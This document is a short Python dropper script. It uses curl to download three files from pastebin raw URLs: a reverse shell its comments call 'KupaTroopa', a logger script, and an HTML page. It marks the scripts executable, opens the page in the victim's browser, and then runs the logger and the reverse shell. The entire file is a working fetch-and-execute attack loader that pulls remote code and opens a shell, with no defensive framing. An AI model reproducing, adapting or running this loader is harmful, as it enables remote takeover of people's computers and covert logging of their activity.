#!/usr/bin/env python3

import os
import subprocess
import sys
import time


# Define URLs and file paths
kupaTroopaUrl = "https://pastebin.com/raw/bPWB8Tu1"
kupaTroopa = "deployPer.py"

loggerUrl = "https://pastebin.com/raw/tzDdnTvy"
logger = "log.py"

siteUrl = "https://pastebin.com/raw/VKiawiBB"
site = "sliBuy.html"

# Download the reverse shell using curl
print("Downloading KupaTroopa with curl...")
try:
    subprocess.run(["curl", "-o", kupaTroopa, kupaTroopaUrl], check=True)
    print("Troopa shell caught")
except subprocess.CalledProcessError as e:
    print("Shell was missed:", e)
    sys.exit(1)

# Download logger
print("Downloading logger with curl...")
try:
    subprocess.run(["curl", "-o", logger, loggerUrl], check=True)
    print("Logger caught")
except subprocess.CalledProcessError as e:
    print("Shell was missed: ", e)
    sys.exit(1)

# Download html
try:
    subprocess.run(["curl", "-o", site, siteUrl], check=True)
    print("Site caught")
except subprocess.CalledProcessError as e:
    print("Site was missed: ", e)
    sys.exit(1)

# Make the downloaded file executable
print("Making the file executable...")
os.chmod(kupaTroopa, 0o755)
os.chmod(logger, 0o755)

time.sleep(2)

print("Opening browser...")
try:
    htmlSite = os.path.abspath(site)
    process = subprocess.run(["xdg-open", htmlSite], check=True)
except Exception as e:
    print(f"Failed to exlecute the file: {e}")

print("Executing logger....")
try:
    process = subprocess.Popen(["python3", logger], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # stdout, stderr = process.communicate()
    # if stderr:
    #     print("Errors\n", stderr.decode())
except Exception as e:
    print(f"Failed to execute the file: {e}")


# Execute the file with Python
print("Executing the reverse...")
try:
    process = subprocess.Popen(["python3", kupaTroopa], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    print("Output:\n", stdout.decode())
    if stderr:
        print("Errors:\n", stderr.decode())
except Exception as e:
    print(f"Failed to execute the file: {e}")


input("Press any key to exit...")
